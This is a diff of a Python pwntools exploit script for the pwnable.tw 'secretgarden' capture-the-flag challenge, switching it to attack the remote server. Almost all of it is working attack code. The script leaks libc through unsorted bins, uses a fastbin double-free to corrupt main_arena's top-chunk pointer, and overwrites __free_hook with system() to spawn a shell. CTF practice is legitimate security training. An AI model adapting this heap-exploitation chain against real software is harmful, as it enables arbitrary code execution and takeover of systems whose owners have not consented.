@@ -1,6 +1,6 @@
 from pwn import *
-io = process('./secretgarden')
-#io = remote('chall.pwnable.tw',10203)
+#io = process('./secretgarden', env = {'LD_PRELOAD' : './libc_64.so.6'})
+io = remote('chall.pwnable.tw',10203)
 l = ELF('./libc_64.so.6')
 
 context.log_level = 'info'
@@ -17,7 +17,10 @@ def flower(name, color, length = 0):
     else:
         io.sendline(str(len(name)))
     io.recvuntil('The name of flower :')
-    io.sendline(name)
+    if length:
+    	io.sendline(name)
+    else:
+	io.send(name)
     io.recvuntil('The color of the flower :')
     io.sendline(color)
     
@@ -26,7 +29,7 @@ def remove(idx):
     io.recvuntil('Which flower do you want to remove from the garden:')
     io.sendline(str(idx))
 
-#leak libc address
+#leak libc address with unsorted bins
 flower('a' * 0x1f0 + p64(0x30) + 'a' * 8, 'A' * 23) # 0
 flower('b' * 0x200, 'B' * 23) # 1
 remove(1)
@@ -35,14 +38,14 @@ flower('', 'C' * 23, 0x100) # 2
 menu(2) #visit
 io.recvuntil('[2] :')
 libc_addr = u64(io.recvuntil('\nColor')[:-6].ljust(8, '\x00'))
-main_arena = libc_addr - 0xa
+libc_addr = libc_addr - 0xa
 log.info('libc_addr :' + hex(libc_addr))
-log.info('main_arena :' + hex(main_arena))
 remove(2)
 menu(4) #clean
 
-libc_main = libc_addr - 0xa - (l.symbols['__malloc_hook'] + 0x30)
-
+libc_main = libc_addr - (l.symbols['__malloc_hook'] - 0x10)
+log.info('libc_main :' + hex(libc_main))
+'''
 #leak heap address
 flower('a', 'A' * 23) #0
 flower('b', 'B' * 23) #1
@@ -55,41 +58,45 @@ heap_addr = u64(io.recvuntil('\nColor')[:-6].ljust(8, '\x00'))
 log.info('heap_addr :' + hex(heap_addr))
 remove(2)
 menu(4) #clean
-
-# make a dup into stack attack
+'''
+# make a dup into libc attack
 flower('a' * 0x60, 'A' * 23) # 0
 flower('b' * 0x60, 'B' * 23) # 1
-flower('c' * 0x60, 'C' * 23) # 2
-flower('d' * 0x60, 'D' * 23) # 3
 
 # fastbin is LIFO
 remove(1) # malloced as name chunk
 remove(0) # malloced as control chunk 
 remove(1) # malloced as name chunk
-#malloc the first two
-flower(p64(main_arena - 0x40 + 0xd - 0x20) + 'e' * 0x58, 'E' * 23) # 4 
-flower('f' * 0x60, 'F' * 23) #5
-flower('g' * 0x60, 'G' * 23) # 6
-
-#next malloc will be the chunk on heap
-payload  = '\x00'*3 + 7 * p64(0)
+#malloc the first three
+flower(p64(libc_addr - 0x20 + 0xd) + 'e' * 0x58, 'E' * 23) # 2 
+flower('f' * 0x60, 'F' * 23) #3
+flower('g' * 0x60, 'G' * 23) #4
+#next malloc will be the chunk on libc
+payload  = '\x00'*3 + 3 * p64(0)
 payload += p64(0x71)
 payload = payload.ljust(0x60, '\x00')
-flower(payload, 'H' * 23) #7 
-#do it again
+flower(payload, 'H' * 23) #5
+#do it again to set the <main_arena + 88>
 remove(1)
 remove(0)
 remove(1)
-flower(p64(main_arena - 0x10) + 'i' * 0x58, 'I' * 23) #8
-flower('/bin/sh\x00'.ljust(0x60, 'j'), 'J' * 23) #9
-flower('k' * 0x60, 'K' * 23) #10
+flower(p64(libc_addr + 0x10) + 'i' * 0x58, 'I' * 23) #6
+flower('/bin/sh\x00'.ljust(0x60, 'j'), 'J' * 23) #7 put /bin/sh on heap
+flower('k' * 0x60, 'K' * 23) #8
 
-#over write the top_chunk pointer in main_arena + 88
-flower(p64(0) * 11 + p64(libc_main + l.symbols['__free_hook'] - 4020), 'J' * 23)
+#over write the top_chunk pointer in libc_addr + 88
+flower(p64(0) * 11 + p64(libc_main + l.symbols['__free_hook'] - 2904), 'J') #9
+
 #now the malloc will be in new top chunks, we just need to calculate the right malloc_size to free_hook
-io.sendline('1')
-io.sendline(str(4020-0x30))
-io.sendline('\x00' * (4020-0x40) + p64(libc_main + l.symbols['system']))
-io.sendline('3')
-io.sendline('9')
+#and because of the sucks IO, we need to malloc carefully, small chunk by small chunk
+#and there are IO about variables before __free_hook, we should set it all NULL, other wise the read will be stucked
+#at <__lll_lock_wait_private+28>
+
+for i in range(0, 3):
+    flower('\x00' * 0x300, '1')
+system_libc = libc_main + l.symbols['system']
+log.info('system :' + hex(system_libc))
+flower('\x00' * 0x158 + p64(system_libc), '2')
+
+#do the free manually to get the remote shell
 io.interactive()
